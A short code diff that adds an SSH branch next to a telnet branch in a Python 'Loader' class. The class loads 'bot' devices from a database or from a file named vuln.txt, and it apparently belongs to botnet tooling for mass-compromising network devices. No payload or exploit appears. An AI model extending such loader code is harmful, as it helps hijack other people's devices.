@@ -18,8 +18,13 @@ class Loader:
     
     def load_device(self):
         if self.list == 'database':
-            for device in database.Database(__CSTRING__).get_telnet_bot():
-                self.devices.append(device)
+            if self.protocol == 'telnet':
+                for device in database.Database(__CSTRING__).get_telnet_bot():
+                    self.devices.append(device)
+            else:
+                for device in database.Database(__CSTRING__).get_ssh_bot():
+                    self.devices.append(device)
+
         else:
             with open('./vuln.txt', 'r+') as vuln_file:
                 for device in vuln_file:
